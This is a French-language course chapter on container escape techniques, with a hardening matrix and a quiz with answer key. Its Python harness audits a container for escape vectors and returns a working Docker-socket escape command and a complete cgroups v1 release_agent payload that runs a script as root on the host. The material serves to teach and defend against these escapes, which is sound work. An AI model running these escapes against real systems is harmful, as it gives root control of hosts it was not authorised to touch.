# TOME P7 — Certifications d'Élite & Spécialisations — Jour 344 (6h) : Container Escape Techniques — Docker Socket Abuse, Privileged Containers, cgroups v1/v2 ReleaseAgent & Kernel Privilege Escalation

> [!NOTE]
> **Objectif du jour :** Maîtriser l'analyse offensive des vulnérabilités d'isolation des conteneurs (**Container Escape Techniques**) : exploiter les conteneurs sur-privilégiés (`--privileged`), abuser de l'exposition du socket Docker (`/var/run/docker.sock`), contourner le confinement via les mécanismes **cgroups v1/v2 `release_agent`**, et réaliser une escalade de privilèges du noyau de l'hôte (Kernel Vulnerabilities / Dirty COW / Dirty Pipe) depuis l'intérieur d'un pod conteneurisé.
>
> **Compétences visées :** `SEC-CONT-01` (A) — Container Escape Vector Identification | `SEC-CONT-02` (A) — Docker Socket Abuse & cgroups release_agent Exploitation

---

## 1) Module — Vecteurs d'Évasion de Conteneurs (2h)

### 📖 Narration/Intuition

Un conteneur Docker/Kubernetes n'est pas une machine virtuelle : c'est un simple **processus Linux isolé** partageant le même noyau que l'hôte via des **Namespaces** (PID, NET, MNT, IPC, UTS, USER) et des **cgroups**. Si les barrières d'isolation sont rompues (mode privilégié, montage de répertoires hôtes sensibles, exposition du socket Docker), le conteneur peut compromettre directement le système hôte.

```
┌─────────────────────────────────────────────────────────────┐
│ CONTENEUR DOCKER (Ring 3 - Espace Utilisateur Conteneurisé) │
│  - Possède l'accès au socket `/var/run/docker.sock` OU      │
│  - Est démarré avec le flag `--privileged` (CAP_SYS_ADMIN)  │
└────────────────────────┬────────────────────────────────────┘
                         │ (Attaque Escape release_agent / Host Mount)
                         ▼
┌─────────────────────────────────────────────────────────────┐
│ SYSTÈME HÔTE (Linux Host Kernel - Privilège Root Hôte)      │
│  - Création d'un conteneur avec `/` de l'hôte monté dans `/mnt`│
│  - Accès total au système de fichiers de l'Hôte (ROOT HOST) │
└─────────────────────────────────────────────────────────────┘
```

---

## 2) Module — Exploit Harness Container Escape (`container_escape_harness.py`) (2h)

### 🛠️ Atelier Pratique

```python
import os
import subprocess

class ContainerEscapeHarness:
    """
    Harness d'audit et de démonstration de techniques d'évasion de conteneurs.
    """

    @staticmethod
    def audit_escape_vectors() -> dict:
        """Vérifie la présence de failles d'isolation courantes dans le conteneur."""
        vectors = {}

        # 1. Test du flag Privileged (Présence de devices hôtes ou CAP_SYS_ADMIN)
        try:
            with open("/proc/self/status", "r") as f:
                status = f.read()
                # Capability CapEff = 0x0000003ffffffff (Toutes les capacités)
                if "CapEff:\t0000003f" in status or "CapEff:\t0000001f" in status:
                    vectors["PRIVILEGED_CONTAINER"] = True
                else:
                    vectors["PRIVILEGED_CONTAINER"] = False
        except Exception:
            vectors["PRIVILEGED_CONTAINER"] = False

        # 2. Test d'exposition du Docker Socket
        vectors["DOCKER_SOCKET_EXPOSED"] = os.path.exists("/var/run/docker.sock")

        # 3. Test de montage du système de fichiers hôte
        vectors["HOST_FS_MOUNTED"] = os.path.exists("/host") or os.path.exists("/etc/shadow")

        return vectors

    @staticmethod
    def exploit_docker_socket_escape() -> str:
        """
        Génère la commande d'évasion via /var/run/docker.sock.
        Spawne un nouveau conteneur qui monte la racine `/` de l'hôte dans `/host`.
        """
        command = (
            "docker run -v /:/host --net=host --privileged -it alpine "
            "chroot /host /bin/bash"
        )
        return command

    @staticmethod
    def exploit_cgroup_release_agent() -> str:
        """
        Payload d'évasion cgroups v1 release_agent (exige CAP_SYS_ADMIN / --privileged).
        """
        payload = """
# 1. Création d'un cgroup temporaire
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. Activation du mécanisme release_agent
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*perdir=\\([^,]*\\).*/\\1/p' /proc/mounts)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. Écriture du script malveillant à exécuter par l'Hôte en Root
echo '#!/bin/sh' > /cmd
echo 'ps aux > /cmd_output' >> /cmd
chmod +x /cmd

# 4. Déclenchement de l'exécution sur l'Hôte
sh -c "echo 0 > /tmp/cgrp/x/cgroup.procs"
"""
        return payload

# Test du Harness
print("=== CONTAINER ESCAPE AUDIT & HARNESS ===")
detected_vectors = ContainerEscapeHarness.audit_escape_vectors()
print("[+] Vecteurs d'évasion détectés dans l'environnement courant :")
for vector, status in detected_vectors.items():
    print(f"    - {vector}: {'⚠️  VULNÉRABLE' if status else 'OK (Isolé)'}")

if detected_vectors["DOCKER_SOCKET_EXPOSED"]:
    print("\n[!] Commande d'Exploitation Docker Socket :")
    print("    ", ContainerEscapeHarness.exploit_docker_socket_escape())
```

---

## 3) Module — Matrice de Hardening des Conteneurs (2h)

```markdown
# CONTAINER HARDENING MATRIX (ANTI-ESCAPE)

| Vecteur d'Attaque | Risque d'Évasion | Mesure de Hardening Obligatoire |
|:---|:---|:---|
| `--privileged` | **CRITIQUE** | Interdire le flag `--privileged`. Utiliser PSS `restricted`. |
| Socket Docker exposé (`docker.sock`) | **CRITIQUE** | Ne JAMAIS monter le socket Docker dans un pod applicatif. |
| Exécution en tant que `root` (UID 0) | **ÉLEVÉ** | Configurer `runAsNonRoot: true` et fixer un UID non privilégié. |
| Capabilities sensibles (`CAP_SYS_ADMIN`) | **ÉLEVÉ** | Supprimer toutes les capacités : `capabilities.drop: ["ALL"]`. |
| Host Path Mounts (`/proc`, `/sys`, `/`) | **CRITIQUE** | Interdire les montages `hostPath` sensibles via OPA Gatekeeper. |
| Kernel Exploits (Dirty Pipe / CVE-2022-0847)| **CRITIQUE** | Patcher le noyau Linux de l'hôte et activer Seccomp (`RuntimeDefault`). |
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **cgroups** | Control Groups — Fonctionnalité du noyau Linux limitant et isolant l'utilisation des ressources (CPU, RAM, E/S) |
| **Namespaces** | Isolation au niveau du noyau Linux permettant de restreindre ce qu'un processus peut voir (PID, Réseau, Points de montage) |
| **CapEff** | Effective Capabilities — Masque des capacités POSIX actuellement actives pour un processus |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Pourquoi le fait de monter le socket Docker (`/var/run/docker.sock`) dans un conteneur utilisateur est-il considéré comme une faille d'évasion critique (Container Escape) ?
- A) Parce que l'accès au socket Docker donne le contrôle total du daemon Docker de l'hôte, permettant de lancer un nouveau conteneur privilégié avec le système de fichiers de l'hôte (`/`) monté, accordant un accès `root` instantané sur l'hôte
- B) Parce que cela ralentit les requêtes HTTP
- C) Parce que le socket Docker contient les mots de passe Wi-Fi
- D) Parce qu'il modifie l'adresse IP du routeur

**Réponse : A**

**Q2 :** Quel est l'effet du flag `--privileged` lors du lancement d'un conteneur Docker ?
- A) Il supprime presque toutes les barrières d'isolation Linux en accordant toutes les capacités POSIX (`CAP_SYS_ADMIN`) et en donnant l'accès à tous les périphériques matériels de l'hôte
- B) Il active le chiffrement de la mémoire
- C) Il bloque toutes les connexions réseau
- D) Il passe le conteneur en lecture seule

**Réponse : A**

**Q3 :** Comment la technique `release_agent` des **cgroups v1** permet-elle l'évasion d'un conteneur ?
- A) Lorsque le dernier processus d'un cgroup se termine, le noyau de l'hôte exécute le binaire spécifié dans `release_agent` avec les privilèges `root` de l'hôte
- B) En modifiant le fichier DNS
- C) En saturant la mémoire RAM
- D) En envoyant des requêtes ICMP

**Réponse : A**

**Q4 :** Quelle est la directive `securityContext` Kubernetes indispensable pour empêcher un conteneur d'exécuter des processus en tant qu'utilisateur `root` (UID 0) ?
- A) `runAsNonRoot: true`
- B) `readOnlyRootFilesystem: false`
- C) `privileged: true`
- D) `allowPrivilegeEscalation: true`

**Réponse : A**

**Q5 :** Quelle est la différence fondamentale d'isolation entre une **Machine Virtuelle (VM)** et un **Conteneur Docker** ?
- A) Une VM possède son propre noyau OS isolé et s'exécute sur un hyperviseur, alors qu'un conteneur partage le même noyau Linux que la machine hôte via des Namespaces et cgroups
- B) Les conteneurs ne peuvent pas utiliser le réseau
- C) Les VMs ne prennent en compte que Windows
- D) Il n'y a aucune différence d'architecture

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
